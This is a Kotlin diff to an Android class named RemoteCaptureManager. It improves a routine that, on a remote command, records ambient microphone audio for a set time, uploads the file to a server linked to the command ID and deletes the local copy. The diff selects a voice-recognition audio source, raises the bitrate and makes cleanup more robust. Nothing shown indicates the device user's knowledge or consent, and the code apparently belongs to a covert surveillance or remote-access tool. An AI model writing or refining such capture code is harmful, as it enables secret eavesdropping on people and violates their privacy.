@@ -162,27 +162,39 @@ object RemoteCaptureManager {
                     MediaRecorder()
                 }
 
+                val audioSource = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    MediaRecorder.AudioSource.VOICE_RECOGNITION
+                } else {
+                    MediaRecorder.AudioSource.MIC
+                }
+
+                try {
+                    recorder.setAudioSource(audioSource)
+                } catch (_: Exception) {
+                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+                }
+
                 recorder.apply {
-                    setAudioSource(MediaRecorder.AudioSource.MIC)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    setAudioEncodingBitRate(128000)
+                    setAudioEncodingBitRate(192000)
                     setAudioSamplingRate(44100)
                     setOutputFile(file.absolutePath)
-                    setMaxDuration(durationSeconds * 1000)
                     prepare()
                     start()
                 }
 
-                Log.d(TAG, "Recording audio for ${durationSeconds}s...")
+                Log.d(TAG, "Recording ambient audio for ${durationSeconds}s...")
                 Thread.sleep(durationSeconds * 1000L)
 
                 try {
                     recorder.stop()
-                    recorder.release()
                 } catch (e: Exception) {
                     Log.e(TAG, "Recorder stop error: ${e.message}")
                 }
+                try {
+                    recorder.release()
+                } catch (_: Exception) {}
                 recorder = null
 
                 Log.d(TAG, "Recording complete, uploading...")
@@ -190,7 +202,7 @@ object RemoteCaptureManager {
                 // Upload as media file — pass commandId to link audio to command
                 val success = ApiClient.uploadAudioFile(file, commandId)
                 Log.d(TAG, "Audio uploaded: $success")
-                file.delete()
+                try { file.delete() } catch (_: Exception) {}
                 callback?.invoke(success)
 
             } catch (e: SecurityException) {
